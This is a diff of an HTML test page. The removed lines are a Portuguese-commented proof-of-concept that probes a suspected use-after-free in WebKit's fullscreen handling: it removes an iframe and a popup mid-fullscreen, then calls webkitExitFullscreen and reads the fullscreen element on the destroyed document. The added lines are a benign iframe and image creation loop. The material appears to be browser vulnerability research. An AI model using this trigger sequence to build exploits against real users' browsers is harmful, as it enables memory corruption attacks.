@@ -1,106 +1,38 @@
+
+<!DOCTYPE html>
 <html>
 <body>
-<button id="run">1. Trigger</button>
-<button id="escalate" disabled>2. Escalar (após tela preta)</button>
-<div id="status">Ready</div>
-<iframe id="testFrame" width="100" height="100"></iframe>
 <script>
-/*
-  Fase 1 — idêntica ao V2: produz tela preta (estado corrompido)
-  Fase 2 — botão separado: com FullscreenManager corrompido,
-  força webkitExitFullscreen() no iDoc destruído.
-  O FullscreenManager tenta despachar fullscreenchange para o
-  Element* freed — crash aqui = UAF confirmado.
-*/
-var iframe    = document.getElementById("testFrame");
-var popup     = null;
-var iDocSaved = null;
+const iterations = 25;
+let n = 0;
 
-iframe.onload = function() {
-    iDocSaved = iframe.contentDocument;
-    iDocSaved.open();
-    iDocSaved.write('<html><body>' +
-        '<div style="width:200px;height:150px;background:blue"></div>' +
-        '</body></html>');
-    iDocSaved.close();
+function runTest(win) {
+    const img = new win.Image();
+    img.onload = function() {};
+    img.onerror = function() {};
+    img.src = "data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=";
+}
 
-    iDocSaved.addEventListener('webkitfullscreenchange', function() {
-        document.getElementById("status").innerHTML = "corrompendo estado...";
+function round() {
+    const frame = document.createElement("iframe");
+    document.body.appendChild(frame);
 
-        if (iframe && iframe.parentNode) iframe.remove();
-        if (popup && !popup.closed) popup.close();
-
-        document.getElementById("escalate").disabled = false;
-        document.getElementById("status").innerHTML +=
-            " | pronto — clique Escalar";
-    });
-};
-
-document.getElementById("escalate").onclick = function() {
-    document.getElementById("status").innerHTML = "escalando...";
-
-    // webkitExitFullscreen no doc FILHO salvo (Document destruído)
-    // FullscreenManager::exitFullscreen() → tenta acessar m_fullscreenElement freed
     try {
-        iDocSaved.webkitExitFullscreen();
-        document.getElementById("status").innerHTML += " | iDoc.exitFs OK";
+        runTest(frame.contentWindow);
     } catch(e) {
-        document.getElementById("status").innerHTML += " | iDoc.exitFs EX:" + e;
+        console.log("ERROR:", e.message);
     }
 
-    // webkitExitFullscreen no doc PRINCIPAL
-    // O FullscreenManager pai precisa limpar referência cross-document
-    try {
-        document.webkitExitFullscreen();
-        document.getElementById("status").innerHTML += " | doc.exitFs OK";
-    } catch(e) {
-        document.getElementById("status").innerHTML += " | doc.exitFs EX:" + e;
+    frame.remove();
+
+    if (++n < iterations) {
+        setTimeout(round, 0);
+    } else {
+        document.body.innerHTML += "<p>TEST FINISHED</p>";
     }
+}
 
-    // Força sync do compositor — tenta acessar o graphics layer órfão
-    // que ainda está ativo (causa da tela preta)
-    document.body.style.transform = "translateZ(0)";
-    var _ = document.body.offsetWidth; // layout síncrono
-    document.body.style.transform = "";
-    var _ = document.body.offsetWidth;
-
-    // Lê dangling pointer do doc destruído
-    try {
-        var el = iDocSaved.webkitFullscreenElement;
-        if (el) {
-            document.getElementById("status").innerHTML +=
-                " | DANGLING! tag=" + el.tagName +
-                " w=" + el.clientWidth;
-        } else {
-            document.getElementById("status").innerHTML += " | fsEl=null";
-        }
-    } catch(e) {
-        document.getElementById("status").innerHTML += " | fsEl EX:" + e;
-    }
-};
-
-document.getElementById("run").onclick = function() {
-    document.getElementById("escalate").disabled = true;
-    document.getElementById("status").innerHTML = "iniciando...";
-
-    popup = window.open("", "_blank", "width=400,height=300");
-    if (!popup) { document.getElementById("status").innerHTML = "bloqueado"; return; }
-    popup.document.open();
-    popup.document.write('<html><body><h3>Popup</h3></body></html>');
-    popup.document.close();
-
-    iDocSaved.documentElement.webkitRequestFullscreen();
-
-    setTimeout(function() {
-        if (!popup || popup.closed) return;
-        popup.focus();
-        window.focus();
-        iframe.contentWindow.focus();
-        setTimeout(function() {
-            if (popup && !popup.closed) popup.close();
-        }, 300);
-    }, 300);
-};
+onload = round;
 </script>
 </body>
 </html>
